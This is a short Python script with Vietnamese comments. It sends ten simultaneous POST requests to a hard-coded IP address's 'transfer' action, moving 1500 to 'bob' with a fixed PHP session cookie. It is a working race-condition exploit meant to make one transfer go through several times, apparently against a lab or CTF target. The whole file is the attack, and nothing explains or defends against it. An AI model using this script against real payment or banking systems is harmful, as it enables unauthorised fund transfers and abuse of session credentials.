import concurrent.futures
import requests

# URL bạn muốn gửi request tới
url = 'http://103.97.125.56:32281/?action=transfer'

# Dữ liệu POST bạn muốn gửi
post_data = {'amount': '1500', 'recipient': 'bob'}
cookies = {'PHPSESSID': '08722117afa32cb5a69e86b1d977530e'}
# Hàm gửi request
def send_request():
    try:
        response = requests.post(url, data=post_data, cookies=cookies)
        return response.status_code, response.text
    except requests.RequestException as e:
        return None, str(e)

# Số lượng request bạn muốn gửi đồng thời
num_requests = 10

# Sử dụng ThreadPoolExecutor để gửi request đồng thời
with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
    futures = [executor.submit(send_request) for _ in range(num_requests)]
    for future in concurrent.futures.as_completed(futures):
        status_code, content = future.result()
        print(f'Status Code: {status_code}\nContent: {content[:100]}\n')

